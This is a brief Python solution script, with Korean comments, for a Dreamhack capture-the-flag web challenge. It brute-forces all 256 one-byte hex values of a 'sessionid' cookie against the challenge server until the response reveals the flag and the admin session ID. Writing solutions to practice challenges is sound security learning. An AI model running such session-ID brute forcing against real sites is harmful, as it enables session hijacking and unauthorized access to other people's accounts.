import requests

# 1. 문제 서버 주소 입력 (http://hostX.dreamhack.games:포트번호/)
url = "http://host8.dreamhack.games:15612/"  # <-- 본인의 접속 정보로 수정!

print(f"[*] Starting Brute Force on {url}...")

# 2. 0x00 부터 0xff 까지 256가지 전수 조사
for i in range(256):
    # 10진수 i를 2자리 16진수 문자열로 변환 (예: 10 -> '0a')
    sess_id = f"{i:02x}"
    
    # 쿠키 설정
    cookies = {'sessionid': sess_id}
    
    # 요청 전송
    try:
        res = requests.get(url, cookies=cookies)
        
        # 3. 응답에 플래그가 있는지 확인
        # 코드상: "flag is " + FLAG 라고 뜸
        if 'flag is' in res.text:
            print(f"[+] FOUND Admin Session ID: {sess_id}")
            print(f"[+] Response: {res.text.strip()}")
            break
            
    except Exception as e:
        print(f"Error: {e}")

print("[*] Done.")